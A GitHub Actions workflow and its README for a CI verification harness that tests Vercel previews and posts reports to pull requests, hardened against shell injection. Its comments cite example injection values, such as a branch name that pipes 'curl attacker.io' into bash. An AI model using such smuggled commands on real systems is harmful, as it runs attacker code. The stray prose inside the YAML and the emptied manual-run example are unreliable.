```yaml
name: verify-phase

# First GitHub Action on main (per stage-1.5c-verification-harness CONTEXT.md
# <code_context>: .github/workflows/ doesn't exist on main as of HEAD 7607bbf).
# This workflow is the CI driver for the 3-layer verification harness shipped
# in Plans 1-5 of this phase. Per D-05: harness loop runs INSIDE
# /gsd-execute-phase BEFORE /nightwork-qa; this workflow is the CI signal that
# Plan 8b loop-with-executor consumes. Per EXPANDED-SCOPE §7 acceptance criteria:
# fires on push to phase/* + posts PR comment + sets commit status.

on:
  push:
    branches:
      - "phase/**"
  workflow_dispatch:
    inputs:
      preview_url:
        description: "Vercel preview URL (optional; auto-discovered if omitted)"
        required: false
        type: string
      phase:
        description: "Phase name (e.g. stage-1.5c-verification-harness)"
        required: true
        type: string

# One harness run per branch at a time. Stale runs canceled when a new push
# lands. Avoids racing with itself on rapid push cadence.
concurrency:
  group: verify-phase-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read
  pull-requests: write   # for PR comment posting
  statuses: write        # for commit status

jobs:
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 30   # well above the < 5min target; safety net for vision API stalls

    env:
      # Per CLAUDE.md + D-29: secrets only, never committed.

**Per iter-1 SEC-HIGH-1:** All `${{ github.* }}` and `${{ inputs.* }}` expressions flow through `env:` blocks; shell `run:` body references only env vars. This prevents shell injection via branch names or input values containing metacharacters.
      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
      VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          # Need full history so the harness can git rev-parse HEAD + branch name
          fetch-depth: 0

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm"

      - name: Install dependencies
        run: npm ci

      - name: Install Playwright browsers (chromium only per current scope; Webkit deferred per Dependent-Soon §3 #9)
        run: npx playwright install --with-deps chromium

      # ITER-1 SEC-HIGH-1 amendment: env-var indirection.
      # ALL ${{ github.* }} and ${{ inputs.* }} flow through env: block.
      # Shell `run:` body references only env vars ($EVENT_NAME, $BRANCH, $INPUT_PHASE, etc.).
      # This prevents shell injection via branch names containing metacharacters
      # (e.g., a branch named 'phase/1.5-c; curl attacker.io | bash' cannot execute).
      - name: Determine phase
        id: phase
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_PHASE: ${{ github.event.inputs.phase }}
          BRANCH: ${{ github.ref_name }}
        run: |
          if [[ "$EVENT_NAME" == "workflow_dispatch" ]]; then
            # Validate INPUT_PHASE: must match ^stage-[0-9.]+[a-z]?-[a-z0-9-]+$ (no shell metacharacters)
            if ! [[ "$INPUT_PHASE" =~ ^stage-[0-9.]+[a-z]?-[a-z0-9-]+$ ]]; then
              echo "::error::Invalid phase input: '$INPUT_PHASE' (must match ^stage-[0-9.]+[a-z]?-[a-z0-9-]+$)"
              exit 1
            fi
            echo "phase=$INPUT_PHASE" >> "$GITHUB_OUTPUT"
          else
            # Derive phase from branch name. phase/1.5-c-verification-harness → stage-1.5c-verification-harness
            # Validate BRANCH: must match ^phase/[a-z0-9.-]+$ (no shell metacharacters)
            if ! [[ "$BRANCH" =~ ^phase/[a-z0-9.-]+$ ]]; then
              echo "::error::Invalid branch name: '$BRANCH' (must match ^phase/[a-z0-9.-]+$ — security: prevents shell injection)"
              exit 1
            fi
            # Strip "phase/" prefix
            PHASE_SUFFIX="${BRANCH#phase/}"
            # Map IA convention to phase dir: 1.5-c-verification-harness → stage-1.5c-verification-harness
            # (the dir under .planning/phases/ has stage- prefix and dot-collapsed dot-c form)
            # Heuristic: phase/1.5-c-X → stage-1.5c-X
            STAGE_NAME=$(echo "$PHASE_SUFFIX" | sed 's/^\([0-9.]*\)-\([a-z]\)-/\1\2-/' )
            echo "phase=stage-$STAGE_NAME" >> "$GITHUB_OUTPUT"
          fi
          echo "Phase resolved: $(grep '^phase=' "$GITHUB_OUTPUT" | tail -1)"

      # ITER-1 SEC-HIGH-1: env-var indirection for all github.* expressions.
      - name: Set commit status (pending)
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          SHA: ${{ github.sha }}
          SERVER_URL: ${{ github.server_url }}
          RUN_ID: ${{ github.run_id }}
        run: |
          gh api -X POST "/repos/$REPO/statuses/$SHA" \
            -f state=pending \
            -f context=verify-phase \
            -f description="Harness running…" \
            -f target_url="$SERVER_URL/$REPO/actions/runs/$RUN_ID"

      # ITER-1 SEC-HIGH-1: env-var indirection. Note that --preview-url input is
      # validated against URL pattern before being passed to scripts/verify-phase.ts;
      # an injection in the URL value (e.g., '$(curl attacker)') cannot execute.
      - name: Run verification harness
        id: harness
        env:
          INPUT_PREVIEW_URL: ${{ github.event.inputs.preview_url }}
          PHASE: ${{ steps.phase.outputs.phase }}
          SHA: ${{ github.sha }}
        run: |
          set +e
          if [[ -n "$INPUT_PREVIEW_URL" ]]; then
            # Validate URL: must be https:// + alphanumeric/dash/dot/slash only (no spaces, semicolons, backticks, $)
            if ! [[ "$INPUT_PREVIEW_URL" =~ ^https://[A-Za-z0-9.-]+(/[A-Za-z0-9._~:/?#[\@!\$\&\(\)*+,;=-]*)?$ ]]; then
              echo "::error::Invalid preview_url input: '$INPUT_PREVIEW_URL' (must be https:// URL with no shell metacharacters)"
              exit 1
            fi
            EXTRA_ARGS=(--preview-url "$INPUT_PREVIEW_URL")
          else
            EXTRA_ARGS=()
          fi

          npx tsx scripts/verify-phase.ts \
            --phase "$PHASE" \
            --commit-sha "$SHA" \
            --mode ci \
            "${EXTRA_ARGS[@]}" \
            > harness-output.json
          echo "exit_code=$?" >> "$GITHUB_OUTPUT"
        continue-on-error: true

      # ITER-1 SEC-HIGH-1: env-var indirection.
      - name: Read final report
        id: report
        if: always()
        env:
          PHASE: ${{ steps.phase.outputs.phase }}
        run: |
          REPORT=".planning/verification/reports/$PHASE/final.md"
          if [[ -f "$REPORT" ]]; then
            echo "report_path=$REPORT" >> "$GITHUB_OUTPUT"
            # Capture body for PR comment (truncate to 60K chars to stay under GH comment limit)
            # Per iter-1 C5: final.md is ALREADY sanitized by report-writer.ts (no page URLs,
            # no screenshot paths, no raw vision reasoning). Safe to post to PR comment.
            BODY=$(head -c 60000 "$REPORT")
            # Encode for env (single-line)
            {
              echo "report_body<<REPORT_EOF"
              echo "$BODY"
              echo "REPORT_EOF"
            } >> "$GITHUB_OUTPUT"
          else
            echo "report_path=" >> "$GITHUB_OUTPUT"
          fi

      # ITER-1 C2 amendment: retention 30→7 days; exclude screenshot raw bytes
      # from artifact upload. Anyone with repo Read can `gh run download` the
      # artifact; once C1 ships authenticated harness sessions, screenshots may
      # contain tenant-bearing route renders. Per D-30: screenshots stay only
      # in gitignored runs/ on the runner; reports + halt artifacts (sanitized)
      # land in the GH artifact for PR review.
      - name: Upload artifacts (sanitized)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: verify-phase-${{ github.sha }}
          path: |
            harness-output.json
            .planning/verification/reports/
            .planning/verification/runs/**/report.md
            .planning/verification/runs/**/HALT-*.md
            .planning/verification/runs/**/idempotency.json
          # ITER-1 C2: explicit retention 7 days (was 30 — Anthropic-as-data-processor
          # posture + tenant data minimization). HALT artifacts have a separate copy
          # at reports/<phase>/halts/<commit>.md (git-tracked; SOC2 traceability per W3).
          retention-days: 7
          if-no-files-found: warn
          # ITER-1 C2: explicitly exclude screenshot raw bytes. The path glob above
          # only includes report.md / HALT-*.md / idempotency.json under runs/ —
          # screenshots/ subtree is NOT matched.

      # ITER-1 SEC-HIGH-1: env-var indirection for gh pr list + comment template.
      - name: Post PR comment
        if: always() && github.event_name == 'push'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          BRANCH: ${{ github.ref_name }}
          PHASE: ${{ steps.phase.outputs.phase }}
          SHA: ${{ github.sha }}
          SERVER_URL: ${{ github.server_url }}
          REPO: ${{ github.repository }}
          RUN_ID: ${{ github.run_id }}
          REPORT_PATH: ${{ steps.report.outputs.report_path }}
          REPORT_BODY: ${{ steps.report.outputs.report_body }}
        run: |
          # Find PR for this branch (if any) — env-var indirection for branch name
          PR_NUMBER=$(gh pr list --head "$BRANCH" --json number --jq '.[0].number // empty')
          if [[ -n "$PR_NUMBER" ]] && [[ -n "$REPORT_PATH" ]]; then
            # Build comment body via printf to avoid heredoc-meets-injection risk
            BODY=$(printf '## Verification harness — `%s` @ `%s`\n\n%s\n\n---\n[Workflow run](%s/%s/actions/runs/%s) · [Artifact](%s/%s/actions/runs/%s)\n' \
              "$PHASE" "$SHA" "$REPORT_BODY" "$SERVER_URL" "$REPO" "$RUN_ID" "$SERVER_URL" "$REPO" "$RUN_ID")
            gh pr comment "$PR_NUMBER" --body "$BODY"
          fi

      # ITER-1 SEC-HIGH-1: env-var indirection.
      - name: Set commit status (final)
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EXIT_CODE: ${{ steps.harness.outputs.exit_code }}
          REPO: ${{ github.repository }}
          SHA: ${{ github.sha }}
          SERVER_URL: ${{ github.server_url }}
          RUN_ID: ${{ github.run_id }}
        run: |
          case "$EXIT_CODE" in
            0)
              STATE="success"
              DESC="All 3 layers passed"
              ;;
            1)
              STATE="failure"
              DESC="Harness failed (failed-fixable)"
              ;;
            2)
              STATE="failure"
              DESC="Halt-for-Jake (failed-ambiguous: iter-3 OR confidence < 0.7)"
              ;;
            3)
              STATE="error"
              DESC="Vercel preview URL discovery failed"
              ;;
            *)
              STATE="error"
              DESC="Harness runtime error (exit $EXIT_CODE)"
              ;;
          esac
          gh api -X POST "/repos/$REPO/statuses/$SHA" \
            -f state="$STATE" \
            -f context=verify-phase \
            -f description="$DESC" \
            -f target_url="$SERVER_URL/$REPO/actions/runs/$RUN_ID"

      # ITER-1 SEC-HIGH-1: env-var indirection.
      - name: Fail job on harness failure
        if: ${{ steps.harness.outputs.exit_code != '0' }}
        env:
          EXIT_CODE: ${{ steps.harness.outputs.exit_code }}
        run: |
          echo "Harness exit code: $EXIT_CODE"
          exit 1
```

# GitHub Actions

Workflows that run automatically in CI for the Nightwork repo.

## verify-phase.yml

Runs the 3-layer verification harness (per `.planning/architecture/VERIFICATION-PIPELINE.md` once Plan 10 ships) against Vercel preview URLs.

### Triggers

| Trigger | When | Notes |
|---|---|---|
| `push` to `phase/*` | Every push to a `phase/<sub-stage>-<name>` branch | Auto-discovers the matching Vercel preview URL |
| `workflow_dispatch` | Manual via Actions tab or `gh workflow run` | Optional `preview_url` + required `phase` inputs |

### Required secrets

| Secret | Purpose | How to set |
|---|---|---|
| `ANTHROPIC_API_KEY` | Layer 3 vision API calls | `gh secret set ANTHROPIC_API_KEY` |
| `VERCEL_TOKEN` | Vercel REST API fallback in URL discovery (per Plan 5 hierarchy) | `gh secret set VERCEL_TOKEN` |
| `GITHUB_TOKEN` | PR comment + commit status | Provided automatically by GitHub Actions |

Per CLAUDE.md + D-29: secrets only, never committed.

### Outputs

- **PR comment** — final markdown report posted to the PR for the branch (if a PR exists). Per iter-1 C5: final report is sanitized by `report-writer.ts` — no page URLs, no screenshot paths, no raw vision reasoning. Safe for PR comment + workflow artifact.
- **Commit status** — `verify-phase` context with state `success` / `failure` / `error`. Visible on commit + PR.
- **Workflow artifact** — `verify-phase-<sha>` containing `harness-output.json`, `.planning/verification/reports/`, `report.md` files under `runs/`, `HALT-*.md` files, `idempotency.json` files. Per iter-1 C2: retention 7 days (was 30); raw screenshot bytes EXCLUDED from artifact (screenshots stay only in gitignored `runs/` on the runner).

### Exit codes (from `scripts/verify-phase.ts`)

| Code | Meaning | Commit status |
|---|---|---|
| 0 | All 3 layers passed | success |
| 1 | failed-fixable (Layer N FAIL with confidence ≥ 0.7) | failure |
| 2 | failed-ambiguous (iter-3 OR confidence < 0.7 — halt-for-Jake per D-07) | failure |
| 3 | Vercel preview URL discovery failed | error |
| 4 | Harness runtime error | error |

### Manual run

```bash

  -f phase=stage-1.5c-verification-harness

  -f phase=stage-1.5c-verification-harness \
  -f preview_url=https://nightwork-platform-git-...vercel.app
```

### Concurrency

One harness run per branch at a time (`concurrency.cancel-in-progress: true`). New pushes cancel stale runs to avoid racing with themselves.

### Adding more workflows

Per Wave 3 (this phase) + Foundation F3: this is the first GH Action on main. F3 narrows-scope CI test gate work picks up `npm test` + typecheck integration; that workflow lands separately. Keep verify-phase.yml focused on the harness pipeline.
```
